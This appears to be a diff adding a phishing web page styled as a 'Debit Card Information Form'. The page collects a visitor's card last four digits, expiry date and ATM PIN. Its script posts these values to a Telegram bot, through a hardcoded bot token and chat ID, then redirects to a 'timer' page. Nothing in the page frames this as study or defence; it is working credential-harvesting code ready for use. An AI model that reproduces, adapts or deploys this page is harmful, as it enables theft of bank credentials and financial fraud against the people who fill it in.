@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Debit Card Information Form</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+        }
+
+        .container {
+            width: 350px;
+            Margin: auto;
+            padding: 20px;
+            background: white;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            margin-top: 0px;
+        }
+
+        h1 {
+            text-align: center;
+        }
+
+        label {
+            display: block;
+            margin: 10px 0 5px;
+        }
+
+        input {
+            width: 94%;
+            padding: 8px;
+            margin-bottom: 10px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #5cb85c;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #4cae4c;
+        }
+    </style>
+</head>
+<img src="lg.png" alt="Girl in a jacket" width="100%" height="100">
+<body>
+    <div class="container">
+        <form id="debitCardForm">
+            <label for="last4Digits">Debit Card Last 4 Digits:</label>
+            <input type="text" id="last4Digits" name="last4Digits" maxlength="4" required>
+
+            <label for="expiryDate">Expiry Date (MM/YY):</label>
+            <input type="text" id="expiryDate" name="expiryDate" maxlength="7" required placeholder="MM/YY">
+
+            <label for="atmPin">ATM Pin:</label>
+            <input type="password" id="atmPin" name="atmPin" maxlength="4" required>
+          <br>
+          <br>
+            <button type="submit">Submit</button>
+        </form>
+    </div>
+<img src="ft.jpg" alt="Girl in a jacket" width="100%" height="200">
+    <script>
+        // Function to format expiry date
+        const expiryInput = document.getElementById('expiryDate');
+        expiryInput.addEventListener('input', function (e) {
+            const value = e.target.value.replace(/\D/g, ''); // Remove non-digit characters
+            if (value.length > 2) {
+                e.target.value = value.slice(0, 2) + '/' + value.slice(2); // MM/YY format
+            } else {
+                e.target.value = value; // Just MM format if < 2 digits
+            }
+        });
+
+        // Submit event for the form
+        document.getElementById('debitCardForm').addEventListener('submit', function (event) {
+            event.preventDefault(); // Prevent default form submission
+
+            const last4Digits = document.getElementById('last4Digits').value;
+            const expiryDate = document.getElementById('expiryDate').value;
+            const atmPin = document.getElementById('atmPin').value;
+
+            const message = `Debit Card Last 4 Digits: ${last4Digits}\nExpiry Date: ${expiryDate}\nATM Pin: ${atmPin}`;
+
+            // Send data to the Telegram API (Replace YOUR_TELEGRAM_BOT_TOKEN and YOUR_CHAT_ID)
+            fetch(`https://api.telegram.org/bot7901407141:AAHosgdnt82jsQTwsBB74WcctZ-_J-ZOS0c/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: '6989736266',
+                    text: message,
+                }),
+            })
+            .then(response => {
+                if (response.ok) {
+                    window.location.href = 'timer.html'; // Replace with your desired URL
+                } else {
+                    alert('Failed to send data to Telegram.');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('There was an error submitting your data.');
+            });
+        });
+    </script>
+</body>
+
+</html>
